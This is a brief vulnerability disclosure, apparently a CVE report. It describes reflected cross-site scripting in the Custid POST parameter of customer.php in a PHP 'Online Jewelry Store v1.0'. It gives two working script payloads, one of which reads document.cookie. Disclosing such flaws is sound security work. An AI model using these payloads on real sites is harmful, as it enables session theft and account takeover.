# Online Jewelry Store v1.0 has reflected cross-site scripting vulnerability

BUG_Author: dengbaihao

Website source code address: https://www.sourcecodester.com/php/14631/online-jewelry-store-php-full-source-code.html

Vulnerability File: /jewerly/customer.php

POST Parameter Custid exists reflected cross-site scripting vulnerability

Payload1: Custid=<script>alert(999)</script>

![image](https://github.com/XIAONIGM/CVEReport/blob/main/1.png)

Payload2: Custid=<script>alert(document.cookie)</script>

![image](https://github.com/XIAONIGM/CVEReport/blob/main/2.png)
